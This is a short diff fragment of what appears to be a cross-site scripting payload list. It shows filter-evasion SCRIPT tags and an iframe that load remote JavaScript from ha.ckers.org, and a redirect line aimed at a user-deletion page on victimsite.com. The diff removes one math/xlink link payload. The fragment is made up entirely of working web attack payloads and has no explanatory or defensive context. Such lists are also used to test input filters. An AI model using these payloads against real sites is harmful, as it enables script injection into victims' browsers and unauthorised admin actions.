@@ -49,4 +49,3 @@ Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
 <SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <iframe src=http://ha.ckers.org/scriptlet.html <
-<math><a xlink:href="//jsfiddle.net/t846h/">click
